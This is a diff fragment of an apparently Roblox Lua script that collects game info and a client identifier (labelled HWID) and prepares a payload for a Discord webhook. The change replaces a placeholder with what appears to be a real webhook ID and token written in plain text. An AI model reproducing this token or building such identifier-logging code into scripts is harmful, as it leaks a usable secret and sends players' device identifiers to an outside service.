@@ -10,7 +10,7 @@ local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
 local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
 
 -- Webhook URL
-local webhookUrl = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+local webhookUrl = "https://discord.com/api/webhooks/1318961945424166973/TBy_bcaVzjkMko3QO4WYK4gRMPlyMReyFn7Tt9jB9ZSObcVCaGnAzCrp8RjQinFbqdjY"
 
 -- Data to send to the webhook
 local payload = {
